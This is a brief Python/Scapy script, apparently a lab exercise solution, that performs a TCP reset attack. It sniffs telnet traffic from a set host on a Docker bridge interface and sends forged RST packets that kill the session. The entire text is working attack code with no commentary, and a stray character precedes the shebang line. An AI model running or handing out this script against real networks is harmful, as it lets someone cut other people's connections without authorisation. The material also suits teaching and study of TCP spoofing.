1#!/usr/bin/python3
from scapy.all import *
def spoof_tcp (pkt) :
  IPLayer = IP(dst=pkt[IP].src, src=pkt[IP].dst)
  TCPLayer = TCP(flags="R",
  seq=pkt [TCP].ack,
  dport=pkt[TCP].sport, sport=pkt[TCP].dport)
  spoofpkt = IPLayer/TCPLayer
  ls (spoofpkt)
  send (spoofpkt, verbose=0)
pkt=sniff (iface = 'br-5b0cbd14ca3b', filter='tcp and port 23 and src 10.9.0.6', prn=spoof_tcp)
